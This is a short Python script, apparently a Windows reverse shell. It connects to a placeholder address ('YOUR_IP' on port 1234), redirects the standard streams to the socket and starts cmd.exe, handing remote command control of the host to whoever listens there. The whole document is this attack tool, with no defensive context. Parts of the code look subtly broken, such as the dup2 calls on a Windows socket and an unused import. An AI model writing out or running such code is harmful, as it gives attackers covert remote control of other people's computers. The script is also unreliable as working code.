```python
import socket,subprocess,os,msvcrt,threading,winsound
def r():
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(('YOUR_IP',1234))
 os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
 s.close()
 msvcrt.setmode(0,os.O_BINARY);msvcrt.setmode(1,os.O_BINARY);msvcrt.setmode(2,os.O_BINARY)
 threading.Thread(target=lambda:subprocess.call(['cmd.exe'])).start()
threading.Thread(target=r).start()
while 1:pass
```